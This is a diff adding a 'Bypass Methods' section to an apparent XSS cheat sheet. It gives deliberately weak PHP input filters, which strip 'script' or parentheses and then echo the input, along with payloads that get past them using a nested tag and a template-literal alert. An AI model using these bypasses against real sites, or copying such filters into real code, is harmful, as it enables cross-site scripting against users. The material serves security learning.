@@ -59,3 +59,42 @@ onbort
 onmouseleave
 oninput
 ```
+
+## Bypass Methods
+
+**Replacement Filter**
+
+>Example PHP Code
+
+```
+<?php
+$name = preg_replace('/script/i', '', $_GET['name']);
+echo $name;
+?>
+```
+
+>Bypass Payload (String in String)
+
+```
+<scrscriptipt>alert('Hello')</scrscriptipt>
+```
+
+**Bypass ()**
+
+>Example PHP Code
+
+```
+<?php
+$name = $_GET['name'];
+$ban = array('\(', '\)');
+foreach($ban as $banned){
+while(preg_match( '/'.$banned.'/i', $name)){
+$name = preg_replace('/'.$banned.'/i', '', $name);}}
+echo $name; ?>
+```
+
+>Bypass Payload
+
+```
+alert`Hello`
+```
